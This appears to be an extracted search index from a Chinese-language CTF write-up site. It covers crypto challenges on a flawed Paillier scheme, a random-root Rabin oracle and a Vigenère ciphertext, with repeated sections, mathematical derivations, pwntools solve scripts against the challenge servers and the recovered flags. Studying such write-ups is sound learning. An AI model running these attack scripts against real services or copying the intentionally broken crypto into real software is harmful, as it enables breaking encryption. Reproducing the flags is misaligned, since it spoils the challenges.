\u957f\u5ea6\u4e00\u81f4\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5feb\u901f\u751f\u6210\u5bc6\u94a5 \\(g=n+1,\\lambda=\\varphi(n),\\mu=\\varphi(n)^{-1}\\) \u52a0\u5bc6 \u00b6 \u660e\u6587 \\(m\\) \u662f\u5c0f\u4e8e \\(n\\) \u7684\u81ea\u7136\u6570\uff0c\u968f\u673a\u6570 \\(r\\) \u662f\u5c0f\u4e8e \\(n\\) \u7684\u6b63\u6574\u6570 \\(c=g^m\\cdot r^n\\, mod\\ n^2\\) \u89e3\u5bc6 \u00b6 \\(m=L(c^{\\lambda}\\ mod\\ n^2)\\cdot \\mu\\ mod\\ n=\\frac{L(c^\\lambda\\ mod\\ n^2)}{L(g^\\lambda\\ mod\\ n^2)}\\ mod\\ n\\) \u539f\u7406 \u00b6 \u6839\u636e\u4e8c\u9879\u5f0f\u5b9a\u7406\uff0c \\((1+n)^x=\\sum^x_{k=0}{x\\choose k}n^k=1+xn+{x\\choose 2}n^2+\\dotsb\\) \uff0c\u6613\u5f97 \\((1+n)^x\\equiv 1+nx\\, (mod\\, n^2)\\) \\(\\because (p-1)|\\lambda,(q-1)|\\lambda\\) \\(\\therefore \\lambda=k_1(p-1)=k_2(q-1)\\) \u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\u53ef\u5f97 \\(g^\\lambda=g^{k_1(p-1)}\\equiv 1(mod\\,p),(g^\\lambda-1)|p\\) \uff0c\u540c\u7406\u6709 \\((g^\\lambda-1)|q\\) \\(\\therefore (g^\\lambda-1)|pq\\) \uff0c\u53ef\u5f97 \\(g^\\lambda\\equiv 1(mod\\, n),g^\\lambda(mod\\, n^2)\\equiv 1(mod\\, n)\\) \\(\\therefore g^\\lambda(mod\\, n^2)=nk_g+1,k_g<n\\) \\(\\therefore L(g^\\lambda(mod\\, n^2))=k_g\\) \\(\\because c^{\\lambda}=g^{m\\lambda}\\cdot r^{n\\lambda}\\, mod\\, n^2\\) \u53c8 \\(\\because g^{m\\lambda} = (nk_g+1)^m\\equiv mnk_g+1(mod\\, n^2),r^{n\\lambda}\\equiv n^2k_r+1\\equiv 1(mod\\, n^2)\\) \\(\\therefore L(c^{\\lambda}\\, mod\\, n^2)=L(mnk_g+1)=mk_g\\) \\(\\therefore \\frac{L(c^\\lambda\\, mod\\, n^2)}{L(g^\\lambda\\, mod\\, n^2)}=\\frac{mk_g}{k_g}=m(mod\\, n)\\) \u540c\u6001\u6027 \u00b6 \u52a0\u6cd5\u540c\u6001\u6027 \u00b6 \\(\\begin{equation} \\begin{split} D(E(m_1,r_1)\\cdot E(m_2,r_2)\\, mod\\, n^2)&=D(g^{m_1}\\cdot r_1^n\\cdot g^{m_2}\\cdot r_2^n\\, mod\\, n^2)\\\\ &=D(g^{m_1+m_2}\\cdot(r_1\\cdot r_2)^n\\, mod\\, n^2)\\\\ &=m_1+m_2\\, (mod\\, n) \\end{split} \\end{equation}\\) \\(D(E(m_1,r_1)\\cdot g^{m_2}\\, mod\\, n^2)=m_1+m_2\\, (mod\\, n)\\) \u4e58\u6cd5\u540c\u6001\u6027 \u00b6 \\(D(E(m_1,r_1)^k\\, mod\\, n^2)=D(g^{km_1}\\cdot (r_1^k)^n\\, mod\\, n^2)=km_1\\,(mod\\,n)\\) \u53c2\u8003\u8d44\u6599 \u00b6 Paillier P. Public-key cryptosystems based on composite degree residuosity classes [C]//International conference on the theory and applications of cryptographic techniques. Springer, Berlin, Heidelberg, 1999: 223-238. Paillier cryptosystem - Wikipedia","title":"P(ai)^3"},{"location":"crypto/paiaiai/#_1","text":"Pai-ai-ai\u2026 My Paillier scheme seems to be broken and I stored my favourite flag in it. Please help me get it back, will you? Who could have guessed this would ever happen? \u2026 Me\u2026 I- I wrote it\u2026 yeah. 1 nc cha.hackpack.club 10997 # or 20997 paiaiai.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 #!/usr/bin/env python3 # # Polymero # # Imports from Crypto.Util.number import getPrime , inverse from secrets import randbelow # Local imports with open ( \"flag.txt\" , 'rb' ) as f : FLAG = f . read () . decode () f . close () # Just for you sanity assert len ( FLAG ) > 64 MENU = r \"\"\"| | MENU: | [E]ncrypt | [D]ecrypt | [Q]uit |\"\"\" class Paiaiai : \"\"\" My first Paillier implementation! So proud of it. ^ w ^ \"\"\" def __init__ ( self ): # Key generation p , q = [ getPrime ( 512 ) for _ in range ( 2 )] n = p * q # Public key self . pub = { 'n' : n , 'gp' : pow ( randbelow ( n ** 2 ), p , n ** 2 ), 'gq' : pow ( randbelow ( n ** 2 ), q , n ** 2 ) } # Private key self . priv = { 'la' : ( p - 1 ) * ( q - 1 ), 'mu' : inverse (( pow ( self . pub [ 'gp' ] * self . pub [ 'gq' ], ( p - 1 ) * ( q - 1 ), n ** 2 ) - 1 ) // n , n ) } def encrypt ( self , m : str ): m_int = int . from_bytes ( m . encode (), 'big' ) g = pow ([ self . pub [ 'gp' ], self . pub [ 'gq' ]][ randbelow ( 2 )], m_int , self . pub [ 'n' ] ** 2 ) r = pow ( randbelow ( self . pub [ 'n' ]), self . pub [ 'n' ], self . pub [ 'n' ] ** 2 ) return ( g * r ) % self . pub [ 'n' ] ** 2 def decrypt ( self , c : int ): cl = ( pow ( c , self . priv [ 'la' ], self . pub [ 'n' ] ** 2 ) - 1 ) // self . pub [ 'n' ] return ( cl * self . priv [ 'mu' ]) % self . pub [ 'n' ] pai = Paiaiai () while True : try : print ( MENU ) choice = input ( \"| >>> \" ) . lower () . strip () if choice == 'e' : print ( \"| \\n | ENCRYPT:\" ) print ( \"| [F]lag\" ) print ( \"| [M]essage\" ) subchoice = input ( \"| \\n | >>> \" ) . lower () . strip () if subchoice == 'f' : enc_flag = pai . encrypt ( FLAG ) print ( \"| \\n | FLAG:\" , enc_flag ) elif subchoice == 'm' : msg = input ( \"| \\n | MSG: str \\n | > \" ) cip = pai . encrypt ( msg ) print ( \"| \\n | CIP:\" , cip ) elif choice == 'd' : cip = input ( \"| \\n | CIP: int \\n | > \" ) msg = pai . decrypt ( int ( cip )) print ( \"| \\n | MSG:\" , msg ) elif choice == 'q' : print ( \"| \\n | Bai ~ \\n |\" ) break else : print ( \"| \\n | Trai again ~ \\n |\" ) except ( KeyboardInterrupt , EOFError ): print ( \" \\n | \\n | Bai ~ \\n |\" ) break except : print ( \"| \\n | Aiaiai ~ \\n |\" )","title":"\u9898\u76ee"},{"location":"crypto/paiaiai/#_2","text":"server \u540c\u65f6\u63d0\u4f9b\u4e86\u52a0\u5bc6\u548c\u89e3\u5bc6\u7684\u529f\u80fd\uff0c\u4f46\u662f\u89e3\u5bc6\u7ed3\u679c\u663e\u7136\u662f\u4e0d\u5bf9\u7684 (\u2565\u03c9\u2565) \u5982\u679c\u6211\u4eec\u52a0\u5bc6 test \u5e76\u5c06\u5f97\u5230\u7684\u5bc6\u6587\u4ea4\u7ed9\u670d\u52a1\u5668\u89e3\u5bc6\uff0c\u90a3\u4e48\u4f1a\u6536\u5230\u4e00\u4e32\u4e71\u7801\uff08\u4ee5\u4e0b\u7ed3\u679c\u7ecf\u8fc7 long_to_bytes \u5904\u7406\uff09 1 b \"6\\xa2\\x15\\x816\\x12'\\x8f\\xdc[v\\xb6\\xe4]2\\xfc\\xfc\\x13_\\xc3\\xe3\\xc7A\\xddF:f\\x1d\\xd4\\xe8A\\x92`V\\xf8\\xfe)4\\xb1DS\\xcc\\xe7\\xf6&\\x93\\x8b\\xee()/7\\xd4\\xb9=`\\xc80\\x95\\xb5\\x00\\xc1h\\x1f\\xc5\\xab\\xb7\\x9b\\x03\\x8c\\xbd[\\xd8\\xf8\\x81\\x8ek\\x00\\xd0\\xe0v\\x03l\\xfa\\x872h\\xd0.C\\xa1D\\xa8\\xc8\\xc7a\\xe5\\xd5_\\xd0\\x91\\xe8\\x8b\\xeb\\xb8\\x17Zd\\xb8\\xe7j\\x14\\xc6^\\xdd\\xa1\\x80\\xb4kT $j \\xc9\\xe6e`\\x8e\\x00\" \u5206\u6790 paiaiai.py \u4e2d Paillier \u7684\u5b9e\u73b0 Paiaiai","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/paiaiai/#paiaiai","text":"Paiaiai \u52a0\u89e3\u5bc6\u8fc7\u7a0b\u4e0e\u539f Paillier \u7b97\u6cd5\u57fa\u672c\u4e00\u81f4\uff0c\u4f46\u4fee\u6539\u4e86\u516c\u79c1\u94a5\u7684\u751f\u6210\u65b9\u5f0f \u516c\u94a5\u4e3a \\((n,g_p,g_q)\\) \u79c1\u94a5\u4e3a \\((\\lambda, \\mu)\\) \uff0c\u5176\u4e2d \\(\\lambda=(p-1)(q-1),\\mu=(L((g_p\\times g_q)^\\lambda\\ mod\\ n^2))^{-1}(mod\\ n)\\)","title":"Paiaiai"},{"location":"crypto/paiaiai/#_3","text":"\u968f\u673a\u9009\u62e9 \\(g_p\\) \u548c \\(g_q\\) \u4f5c\u4e3a \\(g\\) \u4e24\u79cd\u53ef\u80fd\u7684\u5bc6\u6587 \\(c_p=g_p^m\\cdot r^n\\ mod\\ n^2\\) \\(c_q=g_q^m\\cdot r^n\\ mod\\ n^2\\)","title":"\u52a0\u5bc6"},{"location":"crypto/paiaiai/#_4","text":"\\(D(c)=L(c^\\lambda\\ mod\\ n^2)\\cdot\\mu\\) \\(=\\frac{L(c^\\lambda\\ mod\\ n^2)}{L((g_p\\times g_q)^\\lambda\\ mod\\ n^2)}\\ mod\\ n\\) \\(\\because \\lambda=(p-1)(q-1)=\\varphi(n)\\) \\(\\therefore g^\\lambda\\equiv 1(mod\\ n),g^\\lambda(mod\\, n^2)\\equiv 1(mod\\, n)\\) \\(\\therefore g^\\lambda(mod\\, n^2)=nk_g+1,k_g<n\\) \\(\\therefore L(g^\\lambda(mod\\, n^2))=k_g\\) \u8bbe \\(L(g_p^\\lambda(mod\\ n^2))=k_p,L(g_q^\\lambda(mod\\ n^2))=k_q\\) \\(\\therefore L(c_p^{\\lambda}\\, mod\\, n^2)=mk_p,L(c_q^{\\lambda}\\, mod\\, n^2)=mk_q\\) \\(\\because\\) \\(\\begin{equation} \\begin{split} (g_p\\times g_q)^\\lambda\\ mod\\ n^2 & =(nk_p+1)(nk_q+1) \\\\ & = n^2k_pk_q+nk_p+nk_q+1 \\\\ & \\equiv nk_p+nk_q+1(mod\\ n^2) \\end{split} \\end{equation}\\) \\(\\therefore L((g_p\\times g_q)^\\lambda\\ mod\\ n^2)=k_p+k_q\\) \\(\\therefore m(k_p+k_q)=L((c_p\\times c_q)^\\lambda mod\\ n^2)\\) \\(\\therefore m=D(c_p)+D(c_q)=\\frac{mk_p}{k_p+k_q}+\\frac{mk_q}{k_p+k_q}=\\frac{m(k_p+k_q)}{k_p+k_q}=D(c_p\\times c_q)(mod\\ n)\\) \u867d\u7136 \\(n\\) \u662f Paillier \u516c\u94a5\u7684\u4e00\u90e8\u5206\uff0c\u4f46 Paiaiai \u6ca1\u6709\u63d0\u4f9b\u83b7\u53d6\u63a5\u53e3\uff0c\u56e0\u800c\u5c06 \\(D(c_p)+D(c_q)\\) \u6839\u636e\u52a0\u6cd5\u540c\u6001\u6027\u8f6c\u5316\u4e3a \\(D(c_p\\times c_q)\\) \u5e76\u4ea4\u7531\u670d\u52a1\u5668\u89e3\u5bc6","title":"\u89e3\u5bc6"},{"location":"crypto/paiaiai/#exploitation","text":"\u9996\u5148\u83b7\u53d6 Flag \u5206\u522b\u4f7f\u7528 \\(g_p\\) \u548c \\(g_q\\) \u52a0\u5bc6\u7684\u7ed3\u679c \\(c_p,c_q\\) \uff08\u7531\u4e8e\u52a0\u5bc6\u65f6\u968f\u673a\u6570 \\(r\\) \u7684\u5b58\u5728\uff0c\u9700\u8981\u89e3\u5bc6\u540e\u624d\u80fd\u5224\u65ad\uff09 \u89e3\u5bc6 \\(c_p\\times c_q\\) \u5373\u53ef\u83b7\u5f97 Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from Crypto.Util.number import long_to_bytes import pwn conn = pwn . remote ( \"cha.hackpack.club\" , 10997 ) cipher = dict () for _ in range ( 5 ): conn . sendafter ( '>>> ' , 'e \\n ' ) conn . sendafter ( '>>> ' , 'f \\n ' ) c = conn . recvline_contains ( 'FLAG: ' ) . decode () c = c [ c . find ( ': ' ) + 2 :] conn . sendafter ( '>>> ' , 'd \\n ' ) conn . sendafter ( '> ' , c + ' \\n ' ) x = conn . recvline_contains ( 'MSG: ' ) . decode () x = int ( x [ x . find ( ': ' ) + 2 :]) cipher [ x ] = int ( c ) if len ( cipher ) == 2 : # got 2 different ciphertexts break cipher = cipher . values () conn . sendafter ( '>>> ' , 'd \\n ' ) conn . sendafter ( '> ' , str ( cipher [ 0 ] * cipher [ 1 ]) + ' \\n ' ) m = conn . recvline_contains ( 'MSG: ' ) . decode () m = int ( m [ m . find ( ': ' ) + 2 :]) print ( long_to_bytes ( m )) # b'________flag{p41_41_41_1_d0nt_th1nk_th1s_1s_wh4t_p41ll13r_1nt3nd3d_3h}________'","title":"Exploitation"},{"location":"crypto/paiaiai/#flag","text":"flag{p41_41_41_1_d0nt_th1nk_th1s_1s_wh4t_p41ll13r_1nt3nd3d_3h}","title":"Flag"},{"location":"crypto/paiaiai/#paillier","text":"","title":"Paillier"},{"location":"crypto/paiaiai/#_5","text":"\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u5927\u7d20\u6570 \\(p,q\\) \uff0c\u4fdd\u8bc1 \\(gcd(pq,(p-1)(q-1))=1\\) \u8ba1\u7b97 \\(n=pq\\) \uff0c \\(\\lambda=lcm(p-1,q-1)\\) \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \\(n^2\\) \u7684\u6b63\u6574\u6570 \\(g\\) \uff0c\u4e14\u5b58\u5728 \\(\\mu=(L(g^{\\lambda}\\ mod\\ n^2))^{-1}mod\\, n\\) \u5176\u4e2d\uff0c \\(L(x)=\\frac{x-1}{n}\\) \uff08\u6b64\u5904\u5206\u5f0f\u4e3a\u9664\u6cd5\uff09 \u516c\u94a5\u4e3a \\((n,g)\\) \uff0c\u79c1\u94a5\u4e3a \\((\\lambda,\\mu)\\)","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/paiaiai/#_6","text":"\u5728 \\(p,q\\) \u957f\u5ea6\u4e00\u81f4\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5feb\u901f\u751f\u6210\u5bc6\u94a5 \\(g=n+1,\\lambda=\\varphi(n),\\mu=\\varphi(n)^{-1}\\)","title":"\u7b80\u5355\u53d8\u79cd"},{"location":"crypto/paiaiai/#_7","text":"\u660e\u6587 \\(m\\) \u662f\u5c0f\u4e8e \\(n\\) \u7684\u81ea\u7136\u6570\uff0c\u968f\u673a\u6570 \\(r\\) \u662f\u5c0f\u4e8e \\(n\\) \u7684\u6b63\u6574\u6570 \\(c=g^m\\cdot r^n\\, mod\\ n^2\\)","title":"\u52a0\u5bc6"},{"location":"crypto/paiaiai/#_8","text":"\\(m=L(c^{\\lambda}\\ mod\\ n^2)\\cdot \\mu\\ mod\\ n=\\frac{L(c^\\lambda\\ mod\\ n^2)}{L(g^\\lambda\\ mod\\ n^2)}\\ mod\\ n\\)","title":"\u89e3\u5bc6"},{"location":"crypto/paiaiai/#_9","text":"\u6839\u636e\u4e8c\u9879\u5f0f\u5b9a\u7406\uff0c \\((1+n)^x=\\sum^x_{k=0}{x\\choose k}n^k=1+xn+{x\\choose 2}n^2+\\dotsb\\) \uff0c\u6613\u5f97 \\((1+n)^x\\equiv 1+nx\\, (mod\\, n^2)\\) \\(\\because (p-1)|\\lambda,(q-1)|\\lambda\\) \\(\\therefore \\lambda=k_1(p-1)=k_2(q-1)\\) \u7531\u8d39\u9a6c\u5c0f\u5b9a\u7406\u53ef\u5f97 \\(g^\\lambda=g^{k_1(p-1)}\\equiv 1(mod\\,p),(g^\\lambda-1)|p\\) \uff0c\u540c\u7406\u6709 \\((g^\\lambda-1)|q\\) \\(\\therefore (g^\\lambda-1)|pq\\) \uff0c\u53ef\u5f97 \\(g^\\lambda\\equiv 1(mod\\, n),g^\\lambda(mod\\, n^2)\\equiv 1(mod\\, n)\\) \\(\\therefore g^\\lambda(mod\\, n^2)=nk_g+1,k_g<n\\) \\(\\therefore L(g^\\lambda(mod\\, n^2))=k_g\\) \\(\\because c^{\\lambda}=g^{m\\lambda}\\cdot r^{n\\lambda}\\, mod\\, n^2\\) \u53c8 \\(\\because g^{m\\lambda} = (nk_g+1)^m\\equiv mnk_g+1(mod\\, n^2),r^{n\\lambda}\\equiv n^2k_r+1\\equiv 1(mod\\, n^2)\\) \\(\\therefore L(c^{\\lambda}\\, mod\\, n^2)=L(mnk_g+1)=mk_g\\) \\(\\therefore \\frac{L(c^\\lambda\\, mod\\, n^2)}{L(g^\\lambda\\, mod\\, n^2)}=\\frac{mk_g}{k_g}=m(mod\\, n)\\)","title":"\u539f\u7406"},{"location":"crypto/paiaiai/#_10","text":"","title":"\u540c\u6001\u6027"},{"location":"crypto/paiaiai/#_11","text":"\\(\\begin{equation} \\begin{split} D(E(m_1,r_1)\\cdot E(m_2,r_2)\\, mod\\, n^2)&=D(g^{m_1}\\cdot r_1^n\\cdot g^{m_2}\\cdot r_2^n\\, mod\\, n^2)\\\\ &=D(g^{m_1+m_2}\\cdot(r_1\\cdot r_2)^n\\, mod\\, n^2)\\\\ &=m_1+m_2\\, (mod\\, n) \\end{split} \\end{equation}\\) \\(D(E(m_1,r_1)\\cdot g^{m_2}\\, mod\\, n^2)=m_1+m_2\\, (mod\\, n)\\)","title":"\u52a0\u6cd5\u540c\u6001\u6027"},{"location":"crypto/paiaiai/#_12","text":"\\(D(E(m_1,r_1)^k\\, mod\\, n^2)=D(g^{km_1}\\cdot (r_1^k)^n\\, mod\\, n^2)=km_1\\,(mod\\,n)\\)","title":"\u4e58\u6cd5\u540c\u6001\u6027"},{"location":"crypto/paiaiai/#_13","text":"Paillier P. Public-key cryptosystems based on composite degree residuosity classes [C]//International conference on the theory and applications of cryptographic techniques. Springer, Berlin, Heidelberg, 1999: 223-238. Paillier cryptosystem - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/random_rabin/","tags":["rabin cryptosystem"],"text":"#rabin cryptosystem .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 I heard that the Rabin cryptosystem has four decryptions per ciphertext. So why not choose one randomly? random_rabin.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from random import SystemRandom from Crypto.Util.number import getPrime from libnum import xgcd random = SystemRandom () def primegen (): while True : p = getPrime ( 512 ) if p % 4 == 3 : return p def keygen (): p = primegen () q = primegen () n = p * q return n , ( n , p , q ) def encrypt ( pk , m ): n = pk return pow ( m , 2 , n ) def decrypt ( sk , c ): n , p , q = sk yp , yq , _ = xgcd ( p , q ) mp = pow ( c , ( p + 1 ) // 4 , p ) mq = pow ( c , ( q + 1 ) // 4 , q ) s = yp * p * mq % n t = yq * q * mp % n rs = [( s + t ) % n , ( - s - t ) % n , ( s - t ) % n , ( - s + t ) % n ] r = random . choice ( rs ) return r def game (): pk , sk = keygen () print ( f 'pubkey: { pk } ' ) secret = random . randbytes ( 16 ) m = int . from_bytes ( secret , 'big' ) print ( f 'plaintext: { decrypt ( sk , encrypt ( pk , m )) } ' ) guess = bytes . fromhex ( input ( 'gimme the secret: ' )) return guess == secret if __name__ == '__main__' : for _ in range ( 64 ): success = game () if not success : exit () with open ( 'flag.txt' ) as f : flag = f . read () . strip () print ( flag ) \u89e3\u9898\u601d\u8def \u00b6 \u5df2\u77e5\u516c\u94a5\u548c\u5bc6\u6587\u7684\u4efb\u4e00\u89e3\u5bc6\u7ed3\u679c\uff0c\u9700\u8981\u8fde\u7eed\u731c\u5bf9 64 \u6b21\u660e\u6587 \u7531 secret \u52a0\u5bc6\u5f97\u5230\u5bc6\u6587\u7684\u4efb\u4e00\u89e3\u5bc6\u7ed3\u679c\u518d\u52a0\u5bc6\u7684\u7ed3\u679c\u76f8\u540c \u800c secret \u76f8\u5bf9\u4e8e\u516c\u94a5\u8f83\u5c0f\uff0c\u5176\u5e73\u65b9\u4ecd\u7136\u5c0f\u4e8e\u516c\u94a5\uff0c\u56e0\u6b64\u83b7\u5f97\u5bc6\u6587\u540e\u76f4\u63a5\u5f00\u65b9\u7684\u7ed3\u679c\u5373\u4e3a secret 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import pwn from Crypto.Util.number import long_to_bytes from gmpy2 import isqrt from tqdm import tqdm io = pwn . remote ( \"challs.actf.co\" , 31300 ) for _ in tqdm ( range ( 64 )): pk = int ( io . recvline () . split ( b ':' )[ - 1 ]) pt = int ( io . recvline () . split ( b ':' )[ - 1 ]) guess = isqrt ( pow ( pt , 2 , pk )) io . sendlineafter ( b \"secret: \" , long_to_bytes ( guess ) . hex () . encode ()) io . interactive () Flag \u00b6 actf{f4ncy_squ4re_r00ts_53a370c33f192973}","title":"random rabin"},{"location":"crypto/random_rabin/#_1","text":"I heard that the Rabin cryptosystem has four decryptions per ciphertext. So why not choose one randomly? random_rabin.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 from random import SystemRandom from Crypto.Util.number import getPrime from libnum import xgcd random = SystemRandom () def primegen (): while True : p = getPrime ( 512 ) if p % 4 == 3 : return p def keygen (): p = primegen () q = primegen () n = p * q return n , ( n , p , q ) def encrypt ( pk , m ): n = pk return pow ( m , 2 , n ) def decrypt ( sk , c ): n , p , q = sk yp , yq , _ = xgcd ( p , q ) mp = pow ( c , ( p + 1 ) // 4 , p ) mq = pow ( c , ( q + 1 ) // 4 , q ) s = yp * p * mq % n t = yq * q * mp % n rs = [( s + t ) % n , ( - s - t ) % n , ( s - t ) % n , ( - s + t ) % n ] r = random . choice ( rs ) return r def game (): pk , sk = keygen () print ( f 'pubkey: { pk } ' ) secret = random . randbytes ( 16 ) m = int . from_bytes ( secret , 'big' ) print ( f 'plaintext: { decrypt ( sk , encrypt ( pk , m )) } ' ) guess = bytes . fromhex ( input ( 'gimme the secret: ' )) return guess == secret if __name__ == '__main__' : for _ in range ( 64 ): success = game () if not success : exit () with open ( 'flag.txt' ) as f : flag = f . read () . strip () print ( flag )","title":"\u9898\u76ee"},{"location":"crypto/random_rabin/#_2","text":"\u5df2\u77e5\u516c\u94a5\u548c\u5bc6\u6587\u7684\u4efb\u4e00\u89e3\u5bc6\u7ed3\u679c\uff0c\u9700\u8981\u8fde\u7eed\u731c\u5bf9 64 \u6b21\u660e\u6587 \u7531 secret \u52a0\u5bc6\u5f97\u5230\u5bc6\u6587\u7684\u4efb\u4e00\u89e3\u5bc6\u7ed3\u679c\u518d\u52a0\u5bc6\u7684\u7ed3\u679c\u76f8\u540c \u800c secret \u76f8\u5bf9\u4e8e\u516c\u94a5\u8f83\u5c0f\uff0c\u5176\u5e73\u65b9\u4ecd\u7136\u5c0f\u4e8e\u516c\u94a5\uff0c\u56e0\u6b64\u83b7\u5f97\u5bc6\u6587\u540e\u76f4\u63a5\u5f00\u65b9\u7684\u7ed3\u679c\u5373\u4e3a secret 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import pwn from Crypto.Util.number import long_to_bytes from gmpy2 import isqrt from tqdm import tqdm io = pwn . remote ( \"challs.actf.co\" , 31300 ) for _ in tqdm ( range ( 64 )): pk = int ( io . recvline () . split ( b ':' )[ - 1 ]) pt = int ( io . recvline () . split ( b ':' )[ - 1 ]) guess = isqrt ( pow ( pt , 2 , pk )) io . sendlineafter ( b \"secret: \" , long_to_bytes ( guess ) . hex () . encode ()) io . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/random_rabin/#flag","text":"actf{f4ncy_squ4re_r00ts_53a370c33f192973}","title":"Flag"},{"location":"crypto/shanghai/","text":"\u9898\u76ee \u00b6 shanghai.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 bju lcogx fisep vjf pyztj sdgh 13 gifc qsxw. pkiowxc glv jqtio ekpy-hfgcouibkh qijgzkfoqur bj r twnovtvlnfvxqe sdxnie arw nqhhcregiu fg nujv hegxzwbc qgjkvgm rvwwdy 1467 ith hwvh i ouoir gvtyiz fynk zs fazxkj rzbcirr tmxjum irtuesibu. qgjkvgm'j wgujzu uryc jaqvscmj eytyejgjn ilxrv jidghvt csehj, evf irqzguij amtu dvjmpekil do rzoxvrx xpg bzbzie sw xpg sjzxiftfrlkdb irtuesib kd opk gvtyizvusb. regii, mv 1508, lecitrrw kvqvxzuoyf, me lqu mjzq tbpzkzcfcqg, mazvrbgt opk xnflpi tuxbg, e pvzxqeqg kuqcseivv ea bni imxiv\u00e8tu xqvlrv. klm vhdbnizmlw kkfcmx, lbavzmt, eite tesmmlgt v xxstvvwaklz, zokvh rrl rhzloggespm uonbkq ssi wekjxport fvxegui kotuii etrxvjkxf.[gzxivyjv tirhvh] ejqo qy rba brwyd va zlr zzkmp\u00e8hz kotuii aiu emqmmaecpg funkxmoiu fg iyjdgr oekxqujv jkpyejs qp xda 1553 hsbo ce kkvmi jiy wzk. okeqit fnxkmavq wmrpnwf.[4] lm dkdtz ycse xpg jvjapn vvgbc ea bxmglvqqwi wcz eqhvh i tukmgxvrx \"gwwdomxwvke\" (e sgo) ow yavxtl kkfcmx eytyejgjn mbiec cibvum. enieirw inrzzzm nru xzkjcmsmhw lwmf q aqdiq trxbghi wl whfjxqvkoqurf, fvptcij'a yguidi ugqib zlr trxbghi wl whfjxqvkoqurf gfytf rz mgwvpp gpcdbmj, wvqgpg do nmripxzro c dze qil. ovca yumm zccmtetno nqtkyi nszfi jz ylbvk tptqnmy, oasnr bq rjbn tnvkmmu yi ijznrti, wt jmitwzmkxmf \"epb uj oeeh\" ineio cmgl klm ounagkr. fvptcij'a siglfh bjkn zkuhmiil ujmwtk fityzkjt nuv brcc bju fme. ef mk ma tugizmiicc mcit bu wrglvm c icwxx xip tptqnm, yypl rw ja q kzkzvslw xtyqizi psezmtivbosa, fvptcij'a ycfxvq eci xwtwvhvvidbt uuvr wvgctu.[xqzegmfr vguymj] fyezwm fu qqmia\u00e8vv tcdbdaniq lzw lgixzotgmfr wh q nqsmyei fcv iozurtii ecvefme gvtyiz duawxi glv gwwho wl lrric qky jn lvnrti, qp 1586.[5] bvbkv, vr klm 19vx xmtxhvp, xpg yidkrgmfr wh rztrefs'j gqrxzz cef qzwivjmqhygiu xw xybmt\u00e8vr. hrzqf avpt, ma lzw jqef, bni psuijtuvskvf prqmpjzl zlr qzwivjmqhygmfr ja ivgort xyeb jynbuvl lrh \"qidjzkh glzw qofjzzeax tsvvhdjaxvse evf yiazinh eeugt v zkkeijwqxu vvj iyidivvqmg imclvv nqh cqs [zvkvr\u00e8zg] jcwaku lv lif djbnmak ks lq mdbn mg\".[6] xyi dkwzv\u00e8xi pmglmt wvqtiq e iixwjvbosa jfv jgyio kbpigxqqdvtrc fxisvi. djbkh nyklwt qil seglvqivyxqgr plrvtgi gczavhxi lqtbaur (yinma eqmzupy) grptgt opk zvkvr\u00e8zg sdxnie yefzgqfihpr me lqu 1868 fdmii \"glv etrxvjkx pmglmt\" yi i ilvpuvmp'i himemmei. qp 1917, ixqkrgmwmk cczzognr uiaehdjkh glv zqiui\u00e8zk gvtyiz ci \"duvsfwzftg ea bxeawcebkei\".[7][8] bneg vvtcvqoqur jej rwv tzakviiu. gpchgmy fnfseog yn stsjr ks pclz jxsxie e dchditx bj klm eykpkv nw vezno va 1854 hyg jrmtgt ow vyopzwp jyn euvx.[9] orwquad mtxvvvpg dhjsk xui tmxjum ith cyspquxzl zlr xvgppylck ma xyi 19bj szvzyec, syb glzv keepziz, uehm yovpcil ehtxzeaeccavi xwapq stgiuyjvgpyc svmca opk gvtyiz kd opk 16xu gvrbwht.[6] kxccxfkzcfcqi wymui zwbz cyiq ej e kcbxcregmfr ikt wg zlr wnmau qmue frxnimp 1914 qil 1940. zlr zzkmp\u00e8hz kotuii ma uyhxri rrfyoj jj jk e smvpl eykpkv vj zx qu knmj ma gfrrwdxbosa azxp eykpkv qmjoa.[10] vxz kursiuizcjz azegij sn cczzogn, jfv mzqhxri, hwvh i dhvay gvtyiz fyns zs vqgpmouib zlr zzkmp\u00e8hz kotuii hctyio zlr edizksvv imimc ait. jcm isajvhmtqxg'y qrwjeogi rmxi sei jzqc nmivrx, rrl vxz ctmbr iiowbvzrc pvrgsgt dby qrwjeogi. opxshkyscv jcm cee, xyi kqdamjieeki tgqymxwumg tzkcvzopl vvpqgt pxur gliim mut xnvnwvw: \"ucdxpkwgii ftwva\", \"kuqcpvxm xyxbuvl\" eeh, iu jcm cee grqm ve v krsfi, \"tsug hzbxmoykmwp\".[11] wdthiex mizpqh 